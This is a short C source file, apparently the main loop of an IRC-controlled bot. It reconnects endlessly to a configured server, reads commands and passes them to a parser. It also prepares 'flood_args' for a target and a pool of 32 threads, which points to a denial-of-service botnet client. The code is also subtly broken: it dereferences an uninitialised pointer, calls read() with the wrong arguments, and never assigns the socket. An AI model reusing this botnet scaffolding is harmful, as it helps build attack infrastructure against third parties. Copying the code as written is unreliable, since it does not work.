#include "config.h"

int main(){

    int sock = 0, status = 0;
    fd_set fds;
    timeval tv;
    tv.tv_sec = MAX_TIME_WAIT;

    bool MPTCP_ENABLED = 0, connected = 0;

    int len = 0;
    char buf[RECV_BUFFER_SIZE];

    int THREAD_NUM = 32;
    pthread_t threads[THREAD_NUM];
    pthread_attr_t attr;

    flood_args *args;
    args->addr = inet_addr(SERV_ADDR);
    args->port = htons(SERV_PORT);

	while (1)
	{
		printf("Connecting to %s:%d\n", SERV_ADDR, SERV_PORT);

		if (ircConnect() > 0)
		{
			printf("Connected to %s:%d\n", SERV_ADDR, SERV_PORT);
			connected = 1;
			while (sock > 0)
			{
				FD_ZERO(&fds);
				FD_SET(sock, &fds);

				len = 0;
				memset(buf, 0, sizeof(buf));
				while ((status = select(sock, &fds, NULL, NULL, &tv)) > 0){
					if (len == RECV_BUFFER_SIZE - 1){
                            break;
					}
					len += read(sock, buf + len, 1, 0);
					if (buf[len - 1] == '\r' || buf[len - 1] == '\n'){
                            break;
					}
				}
				if (status <= 0){
                    break;
				}
				else if (len < 2){
                    continue;
				}
				else
				{
					buf[len - 1] = 0;
					if(ircParse(buf) == 2){
                        close(sock);
                        return 0;
					}
				}
			}
			printf("Connection lost\n");
			close(sock);
		}
		sleep(RECONNECT_TIME);
	}
	close(sock);
	return 0;
}
